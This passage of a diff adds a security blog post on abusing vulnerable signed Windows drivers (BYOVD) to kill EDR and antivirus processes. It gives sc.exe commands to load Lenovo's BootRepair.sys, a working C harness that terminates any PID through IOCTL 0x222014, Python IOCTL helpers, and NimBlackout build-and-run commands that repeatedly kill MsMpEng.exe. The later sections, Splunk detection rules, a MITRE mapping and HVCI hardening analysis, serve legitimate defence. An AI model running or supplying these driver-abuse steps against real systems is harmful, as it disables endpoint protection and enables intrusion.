+    <div style="margin-top:10px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">open_device</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">path</span><span style="color:#8b949e;">: str):</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">CreateFileW</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">path</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">GENERIC_RW</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">FILE_SHARE_RW</span><span style="color:#8b949e;">,</span></div>
+    <div style="margin-left:60px;"><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">OPEN_EXISTING</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x80</span><span style="color:#8b949e;">, </span><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">)</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">if </span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> == </span><span style="color:#a78bfa;">INVALID_HANDLE</span><span style="color:#8b949e;">:</span></div>
+    <div style="margin-left:40px;"><span style="color:#60a5fa;">raise </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">WinError</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">get_last_error</span><span style="color:#8b949e;">())</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#a78bfa;">h</span></div>
+    <div style="margin-top:10px;"><span style="color:#60a5fa;">def </span><span style="color:#fbbf24;">send_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">code</span><span style="color:#8b949e;">: int, </span><span style="color:#f97316;">data</span><span style="color:#8b949e;">: bytes, </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">: int = </span><span style="color:#f97316;">0</span><span style="color:#8b949e;">) -&gt; bytes:</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">buf_in</span><span style="color:#8b949e;">  = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">create_string_buffer</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">data</span><span style="color:#8b949e;">)</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;"> = </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">create_string_buffer</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">) </span><span style="color:#60a5fa;">if </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;"> </span><span style="color:#60a5fa;">else </span><span style="color:#60a5fa;">None</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">       = </span><span style="color:#a78bfa;">wt</span><span style="color:#8b949e;">.</span><span style="color:#a78bfa;">DWORD</span><span style="color:#8b949e;">(0)</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">ok</span><span style="color:#8b949e;">      = </span><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">code</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">buf_in</span><span style="color:#8b949e;">, </span><span style="color:#fbbf24;">len</span><span style="color:#8b949e;">(</span><span style="color:#f97316;">data</span><span style="color:#8b949e;">),</span></div>
+    <div style="margin-left:64px;"><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">out_len</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">byref</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">), </span><span style="color:#60a5fa;">None</span><span style="color:#8b949e;">)</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">if not </span><span style="color:#a78bfa;">ok</span><span style="color:#8b949e;">:</span></div>
+    <div style="margin-left:40px;"><span style="color:#60a5fa;">raise </span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">WinError</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">ctypes</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">get_last_error</span><span style="color:#8b949e;">())</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">return </span><span style="color:#fbbf24;">bytes</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;">)[:</span><span style="color:#a78bfa;">n</span><span style="color:#8b949e;">.value] </span><span style="color:#60a5fa;">if </span><span style="color:#a78bfa;">buf_out</span><span style="color:#8b949e;"> </span><span style="color:#60a5fa;">else </span><span style="color:#17fe33;">b""</span></div>
+    <div style="margin-top:10px;padding-top:10px;border-top:1px solid #21262d;">
+      <span style="color:#484f58;"># --- send IOCTL 0x222014 to BootRepair.sys ---</span>
+    </div>
+    <div><span style="color:#a78bfa;">target_pid</span><span style="color:#8b949e;"> = </span><span style="color:#f97316;">1234</span><span style="color:#484f58;">                     # replace with real PID</span></div>
+    <div><span style="color:#a78bfa;">h</span><span style="color:#8b949e;"> = </span><span style="color:#fbbf24;">open_device</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">r"\\.\BootRepair"</span><span style="color:#8b949e;">)</span></div>
+    <div><span style="color:#60a5fa;">try</span><span style="color:#8b949e;">:</span></div>
+    <div style="margin-left:20px;"><span style="color:#fbbf24;">send_ioctl</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">, struct.</span><span style="color:#fbbf24;">pack</span><span style="color:#8b949e;">(</span><span style="color:#17fe33;">"&lt;I"</span><span style="color:#8b949e;">, </span><span style="color:#a78bfa;">target_pid</span><span style="color:#8b949e;">))</span></div>
+    <div><span style="color:#60a5fa;">finally</span><span style="color:#8b949e;">:</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">kernel32</span><span style="color:#8b949e;">.</span><span style="color:#fbbf24;">CloseHandle</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">h</span><span style="color:#8b949e;">)</span></div>
+  </div>
+</div>
+
+<p><code class="language-plaintext highlighter-rouge">send_ioctl</code> handles buffer allocation and Win32 error translation automatically. For <code class="language-plaintext highlighter-rouge">METHOD_BUFFERED</code> IOCTLs the kernel copies <code class="language-plaintext highlighter-rouge">data</code> into <code class="language-plaintext highlighter-rouge">SystemBuffer</code> without any MDL work on the caller’s side. The call requires Administrator privileges to open the device handle, matching the standard BYOVD prerequisite. For drivers with <code class="language-plaintext highlighter-rouge">METHOD_NEITHER</code> (raw pointer pass-through), the input buffer must be a locked, page-aligned allocation — avoid those drivers in PoC work unless you are comfortable with structured exception handling in kernel mode.</p>
+
+<hr>
+
+<h2 id="phase-3-exploitation">Phase 3: Exploitation</h2>
+
+<p>With symbolic link, IOCTL code, and buffer layout in hand, exploitation reduces to a handful of Win32 API calls requiring only administrative privileges.</p>
+
+<h3 id="case-study-phantomkiller">Case Study: PhantomKiller</h3>
+
+<p><a href="https://github.com/redteamfortress/PhantomKiller">PhantomKiller</a> by j3h4ck (redteamfortress) documents the end-to-end weaponisation of <code class="language-plaintext highlighter-rouge">BootRepair.sys</code>, a Lenovo PC Manager driver signed by Symantec under LENOVO’s code-signing certificate (SHA-256, compiled 2018-01-03). Found on VirusTotal with 0/71 detections at time of discovery.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>File</td>
+      <td><code class="language-plaintext highlighter-rouge">BootRepair.sys</code></td>
+    </tr>
+    <tr>
+      <td>SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">5ab36c116767eaae53a466fbc2dae7cfd608ed77721f65e83312037fbd57c946</code></td>
+    </tr>
+    <tr>
+      <td>Signer</td>
+      <td>LENOVO (Symantec Class 3 SHA256 Code Signing CA)</td>
+    </tr>
+    <tr>
+      <td>Compiled</td>
+      <td>2018-01-03</td>
+    </tr>
+    <tr>
+      <td>VT hits</td>
+      <td>0/71 at discovery</td>
+    </tr>
+    <tr>
+      <td>Device path</td>
+      <td><code class="language-plaintext highlighter-rouge">\\.\BootRepair</code></td>
+    </tr>
+    <tr>
+      <td>IOCTL</td>
+      <td><code class="language-plaintext highlighter-rouge">0x222014</code></td>
+    </tr>
+    <tr>
+      <td>Input</td>
+      <td>4-byte DWORD PID</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Loading the driver:</strong></p>
+
+<div class="language-batch highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="c">rem Requires Administrator. DSE satisfied — legitimately signed.</span>
+<span class="nb">sc.exe</span> <span class="kd">create</span> <span class="kd">PhantomKiller</span> <span class="kd">binPath</span><span class="o">=</span><span class="s2">"C:\tools\BootRepair.sys"</span> <span class="nb">type</span><span class="o">=</span><span class="kd">kernel</span>
+<span class="nb">sc.exe</span> <span class="nb">start</span> <span class="kd">PhantomKiller</span>
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<p><strong>The exploit harness (simplified):</strong></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define IOCTL_KILL_PROCESS 0x222014
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">targetPid</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="c1">// No DACL on device → CreateFile succeeds for any caller</span>
+    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span>
+        <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">BootRepair"</span><span class="p">,</span>
+        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+    <span class="p">);</span>
+
+    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">DeviceIoControl</span><span class="p">(</span>
+        <span class="n">hDevice</span><span class="p">,</span>
+        <span class="n">IOCTL_KILL_PROCESS</span><span class="p">,</span>   <span class="c1">// 0x222014</span>
+        <span class="o">&amp;</span><span class="n">targetPid</span><span class="p">,</span>           <span class="c1">// Input: 4-byte PID</span>
+        <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">),</span>        <span class="c1">// InputBufferLength: 4</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span>
+    <span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Process %d terminated via kernel</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">targetPid</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<h3 id="the-full-kernel-call-chain">The Full Kernel Call Chain</h3>
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">kernel_call_chain — BootRepair.sys › ZwTerminateProcess</span>
+  </div>
+  <div style="font-family:'Courier New',monospace;font-size:12.5px;line-height:2.0;">
+
+    <!-- Ring 3 zone -->
+    <div style="background:#0d1117;padding:12px 22px 14px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 3 · User Mode</div>
+      <div><span style="color:#8b949e;">CreateFile(</span><span style="color:#17fe33;">"\\.\BootRepair"</span><span style="color:#8b949e;">) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hDevice</span></div>
+      <div><span style="color:#60a5fa;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hDevice</span><span style="color:#8b949e;">,&nbsp;</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;">,&nbsp;&amp;pid,&nbsp;4)</span></div>
+    </div>
+
+    <!-- Ring boundary -->
+    <div style="background:#161b22;text-align:center;padding:7px 0;color:#f97316;font-size:11px;letter-spacing:1px;border-top:1px dashed #30363d;border-bottom:1px dashed #30363d;">
+      ▼&nbsp;&nbsp;IRP crosses Ring 3 → Ring 0 boundary&nbsp;&nbsp;▼
+    </div>
+
+    <!-- Ring 0 zone -->
+    <div style="background:#0d1117;padding:12px 22px 16px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 0 · Kernel Mode</div>
+      <div><span style="color:#8b949e;">IRP dispatch → </span><span style="color:#a78bfa;">MajorFunction</span><span style="color:#8b949e;">[14]</span><span style="color:#484f58;">&nbsp;&nbsp;; IRP_MJ_DEVICE_CONTROL</span></div>
+      <div style="margin-left:22px;"><span style="color:#484f58;">└─► </span><span style="color:#8b949e;">IOCTL match&nbsp;</span><span style="color:#f97316;">0x222014</span><span style="color:#8b949e;"> → call </span><span style="color:#fbbf24;">terminate_proc</span><span style="color:#8b949e;">(pid)</span></div>
+      <div style="margin-left:46px;"><span style="color:#484f58;">├─► </span><span style="color:#17fe33;">PsLookupProcessByProcessId</span><span style="color:#8b949e;">(pid) </span><span style="color:#484f58;">→ </span><span style="color:#a78bfa;">PEPROCESS</span><span style="color:#8b949e;"> *</span></div>
+      <div style="margin-left:46px;"><span style="color:#484f58;">├─► </span><span style="color:#17fe33;">ObOpenObjectByPointer</span><span style="color:#8b949e;">(</span><span style="color:#a78bfa;">PEPROCESS</span><span style="color:#8b949e;">*) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hProcess</span><span style="color:#484f58;">&nbsp;&nbsp;; PROCESS_ALL_ACCESS · no PPL check</span></div>
+      <div style="margin-left:46px;"><span style="color:#484f58;">└─► </span><span style="color:#f97316;">ZwTerminateProcess</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hProcess</span><span style="color:#8b949e;">, 0)</span></div>
+    </div>
+
+    <!-- Impact zone -->
+    <div style="background:#160b0b;padding:12px 22px 14px;border-top:2px solid #7f1d1d;">
+      <div style="color:#ef4444;font-weight:600;margin-bottom:8px;">◼ Target process exits</div>
+      <div style="display:flex;gap:28px;flex-wrap:wrap;">
+        <span style="color:#6b7280;font-size:11px;">✗ PPL protection bypassed</span>
+        <span style="color:#6b7280;font-size:11px;">✗ No access check performed</span>
+        <span style="color:#6b7280;font-size:11px;">✗ EDR tamper-protection: irrelevant</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<p>PPL protection is enforced at the user-mode <code class="language-plaintext highlighter-rouge">OpenProcess</code> boundary, not at the kernel object level when a driver acquires the handle directly via <code class="language-plaintext highlighter-rouge">ObOpenObjectByPointer</code>. This is the fundamental architectural gap that BYOVD exploits.</p>
+
+<h3 id="nimblackout">NimBlackout</h3>
+
+<p><a href="https://github.com/Helixo32/NimBlackout">NimBlackout</a> adapts the same technique (originally from ZeroMemoryEx’s Blackout project using the <code class="language-plaintext highlighter-rouge">gmer.sys</code> driver) in Nim. The keep-alive pattern is the operationally significant addition: EDR vendors configure agents to respawn via watchdog services. NimBlackout loops continuously, re-killing the target each time it restarts, converting a one-shot termination into persistent blindness:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight-wrapper"><div class="highlight"><pre class="highlight"><code><span class="c"># Cross-compile from Linux</span>
+nim <span class="nt">--os</span>:windows <span class="nt">--cpu</span>:amd64 <span class="se">\</span>
+    <span class="nt">--gcc</span>.exe:x86_64-w64-mingw32-gcc <span class="se">\</span>
+    <span class="nt">--gcc</span>.linkerexe:x86_64-w64-mingw32-gcc <span class="se">\</span>
+    c NimBlackout.nim
+
+<span class="c"># Execute — loops to defeat EDR watchdog respawn</span>
+.<span class="se">\N</span>imBlackout.exe MsMpEng.exe
+</code></pre></div><button class="copy-code-button" type="button">
+      <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path>
+        <path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
+      </svg>
+      Copy
+    </button></div></div>
+
+<hr>
+
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>ID</th>
+      <th>BYOVD Manifestation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Exploit Privilege Escalation</td>
+      <td><code class="language-plaintext highlighter-rouge">T1068</code></td>
+      <td>Admin → Ring 0 effective privilege via vulnerable driver</td>
+    </tr>
+    <tr>
+      <td>Impair Defenses: Disable/Remove Tools</td>
+      <td><code class="language-plaintext highlighter-rouge">T1562.001</code></td>
+      <td>EDR/AV process terminated via kernel call</td>
+    </tr>
+    <tr>
+      <td>Create or Modify System Process</td>
+      <td><code class="language-plaintext highlighter-rouge">T1543.003</code></td>
+      <td>Driver loaded as kernel service via <code class="language-plaintext highlighter-rouge">sc.exe</code></td>
+    </tr>
+    <tr>
+      <td>Rootkit</td>
+      <td><code class="language-plaintext highlighter-rouge">T1014</code></td>
+      <td>Kernel-mode code with no user-mode visibility</td>
+    </tr>
+    <tr>
+      <td>Defense Evasion: Signed Binary</td>
+      <td><code class="language-plaintext highlighter-rouge">T1553.002</code></td>
+      <td>Signed driver circumvents DSE and AV signature checks</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr>
+
+<h2 id="detection-engineering-and-hunting-playbook">Detection Engineering and Hunting Playbook</h2>
+
+<h3 id="signal-1-driver-load-events">Signal 1: Driver Load Events</h3>
+
+<p><strong>Sysmon Event ID 6</strong> fires on every kernel driver load. It captures the SHA-256 hash at load time, matchable against LOLDrivers in near-real-time.</p>
+
+<pre><code class="language-spl">index=sysmon EventCode=6
+| rex field=Hashes "SHA256=(?P&lt;sha256&gt;[A-Fa-f0-9]{64})"
+| where match(ImageLoaded, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\users\\\\[^\\\\]+\\\\desktop\\\\)")
+| table _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
+| sort - _time
+</code></pre>
+
+<h3 id="signal-2-service-creation-of-kernel-drivers">Signal 2: Service Creation of Kernel Drivers</h3>
+
+<p>Windows Event Log <code class="language-plaintext highlighter-rouge">System / 7045</code> with <code class="language-plaintext highlighter-rouge">ServiceType=1</code> from a non-standard binary path is near-definitive:</p>
+
+<pre><code class="language-spl">index=wineventlog source="WinEventLog:System" EventCode=7045
+| where ServiceType="kernel"
+| where NOT match(ImagePath, "(?i)(system32\\\\drivers|program files)")
+| table _time, ComputerName, ServiceName, ImagePath, ServiceType
+</code></pre>
+
+<h3 id="signal-3-deviceiocontrol-to-unknown-devices">Signal 3: DeviceIoControl to Unknown Devices</h3>
+
+<p>Monitor <code class="language-plaintext highlighter-rouge">CreateFile</code> with <code class="language-plaintext highlighter-rouge">\\.\</code> device paths combined with subsequent <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> calls from unexpected processes. Any non-system, non-hardware-management software opening a raw device path is suspicious.</p>
+
+<h3 id="signal-4-protected-process-termination-anomalies">Signal 4: Protected Process Termination Anomalies</h3>
+
+<p>Correlate EDR heartbeat absence with recent driver load:</p>
+
+<ul>
+  <li>EDR service stopped (Event 7036) without planned shutdown</li>
+  <li>Sysmon EID 5 (process terminate) on known EDR process names within 10 minutes of EID 6 (driver load)</li>
+</ul>
+
+<h3 id="signal-5-loldrivers-hash-matching-at-ingest">Signal 5: LOLDrivers Hash Matching at Ingest</h3>
+
+<pre><code class="language-spl">index=sysmon EventCode=6
+| rex field=Hashes "SHA256=(?P&lt;sha256&gt;[A-Fa-f0-9]{64})"
+| lookup loldrivers.csv sha256 AS sha256 OUTPUT driver_name, cve, primitive
+| where isnotnull(primitive)
+| table _time, Computer, ImageLoaded, sha256, driver_name, primitive
+</code></pre>
+
+<p>Maintain the lookup table from <a href="https://www.loldrivers.io/api/drivers.csv">loldrivers.io/api/drivers.csv</a> (updated daily via a scheduled task).</p>
+
+<h3 id="splunk-detection-rules">Splunk Detection Rules</h3>
+
+<p><strong>Rule 1: BYOVD Kernel Driver Loaded from User Path</strong></p>
+
+<pre><code class="language-spl">index=sysmon EventCode=6
+| rex field=Hashes "SHA256=(?P&lt;sha256&gt;[A-Fa-f0-9]{64})"
+| eval path_suspicious=if(match(ImageLoaded,
+    "(?i)(\\\\temp\\\\|\\\\users\\\\.*\\\\appdata\\\\|\\\\programdata\\\\|\\\\downloads\\\\)"),
+    1, 0)
+| where path_suspicious=1 OR Signed="false"
+| stats count by _time, Computer, ImageLoaded, sha256, Signed, SignatureStatus
+| sort - _time
+</code></pre>
+
+<p><strong>Rule 2: New Kernel Service + Driver Load Correlation (within 60 seconds)</strong></p>
+
+<pre><code class="language-spl">index=wineventlog source="WinEventLog:System" EventCode=7045 ServiceType="kernel"
+| join type=inner ComputerName [
+    search index=sysmon EventCode=6
+    | rename Computer AS ComputerName
+]
+| where Signed="false" OR match(ImagePath, "(?i)(\\\\temp\\\\|\\\\appdata\\\\)")
+| table _time, ComputerName, ServiceName, ImagePath
+</code></pre>
+
+<p><strong>Rule 3: EDR Process Missing + Recent Driver Load (Threat Hunt)</strong></p>
+
+<pre><code class="language-spl">index=sysmon EventCode=5
+| where Image IN ("MsMpEng.exe", "SentinelAgent.exe", "CSFalconService.exe",
+                  "CrowdStrike.exe", "cb.exe", "elastic-agent.exe")
+| eval kill_time=_time
+| join type=inner Computer [
+    search index=sysmon EventCode=6 earliest=-10m latest=+0m
+    | where NOT match(ImageLoaded, "(?i)(system32\\\\drivers|program files)")
+    | eval driver_load_time=_time
+]
+| where kill_time &gt; driver_load_time AND kill_time &lt; (driver_load_time + 600)
+| table _time, Computer, Image, ImageLoaded, Hashes
+</code></pre>
+
+<hr>
+
+<h2 id="defensive-architecture-hvci-deep-dive">Defensive Architecture: HVCI Deep Dive</h2>
+
+<h3 id="what-hvci-actually-enforces">What HVCI Actually Enforces</h3>
+
+<p>HVCI (Hypervisor-Protected Code Integrity, also called Memory Integrity) uses the hypervisor to move kernel code integrity checks into a more privileged context than the Windows kernel itself:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Requirement</th>
+      <th>DSE Only</th>
+      <th>DSE + HVCI</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Valid Authenticode signature</td>
+      <td>✔</td>
+      <td>✔</td>
+    </tr>
+    <tr>
+      <td>Chain to trusted root</td>
+      <td>✔</td>
+      <td>✔</td>
+    </tr>
+    <tr>
+      <td>EV code signing cert or WHQL</td>
+      <td>Optional</td>
+      <td>Required for new drivers</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">FORCE_INTEGRITY</code> flag in PE header</td>
+      <td>Not checked</td>
+      <td>Required</td>
+    </tr>
+    <tr>
+      <td>No W+X memory sections</td>
+      <td>Not checked</td>
+      <td>Enforced by hypervisor</td>
+    </tr>
+    <tr>
+      <td>No self-modifying code</td>
+      <td>Not checked</td>
+      <td>Enforced by hypervisor</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Legacy drivers compiled before ~2015 almost universally fail the W+X and <code class="language-plaintext highlighter-rouge">FORCE_INTEGRITY</code> checks. They are legitimately signed (DSE passes) but cannot load under HVCI. HVCI is the single most effective architectural control against BYOVD, though adoption remains below 50% on Windows 11-capable hardware as of 2025.</p>
+
+<h3 id="the-hvci-block-list-gap-where-byovd-still-lives">The HVCI Block List Gap: Where BYOVD Still Lives</h3>
+
+<p>Even with HVCI enabled, a driver loads if its PE image meets HVCI structural requirements AND its hash is not in the WDAC Vulnerable Driver Block List (<code class="language-plaintext highlighter-rouge">SiPolicy_Enforced.p7b</code>). As of June 23, 2026, LOLDrivers tracks <strong>479 of 2,197</strong> catalogued samples (21.8%) that bypass HVCI. Another 789 samples (36.3%) are not in Microsoft’s block list at all. Microsoft updates the block list once or twice per year; a driver found in January may remain loadable on HVCI-enabled systems for months.</p>
+
+<h3 id="hunting-for-a-working-byovd-candidate">Hunting for a Working BYOVD Candidate</h3>
+
+<!-- ============================================================
+     DIAGRAM 4 — HVCI Driver Selection Funnel
+     ============================================================ -->
+<div style="margin:2rem 0;overflow-x:auto;">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 490" width="100%" style="max-width:860px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
+  <rect width="860" height="490" fill="#0d1117" rx="10"></rect>
+  <rect width="860" height="490" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"></rect>
+  <text x="430" y="26" font-size="14" fill="#e6edf3" text-anchor="middle" font-weight="bold">BYOVD Candidate Selection Funnel — HVCI-Aware Triage</text>
+  <text x="430" y="43" font-size="10" fill="#8b949e" text-anchor="middle">From 2,197 LOLDrivers samples → operationally viable EDR/PPL killer · Data: loldrivers.io 2026-06-23</text>
+
+  <!-- Stage 1 -->
+  <polygon points="80,52 780,52 740,96 120,96" fill="#1a3a5c" stroke="#2471a3" stroke-width="1.5"></polygon>
+  <text x="430" y="70" font-size="13" fill="#aed6f1" text-anchor="middle" font-weight="bold">LOLDrivers Catalogue</text>
+  <text x="430" y="87" font-size="10" fill="#85c1e9" text-anchor="middle">2,197 samples total · 656 unique drivers · loldrivers.io/api/drivers.json</text>
+  <text x="792" y="77" font-size="8" fill="#566573">Updated 2026-06-23</text>
+
+  <!-- Filter 1 -->
+  <line x1="430" y1="97" x2="430" y2="112" stroke="#566573" stroke-width="1.5"></line>
+  <rect x="250" y="109" width="360" height="18" fill="#161b22" rx="3" stroke="#2c3e50"></rect>
+  <text x="430" y="122" font-size="9" fill="#8b949e" text-anchor="middle">① Filter: primitive ∈ {process-kill, kernel-write, phys-read}</text>
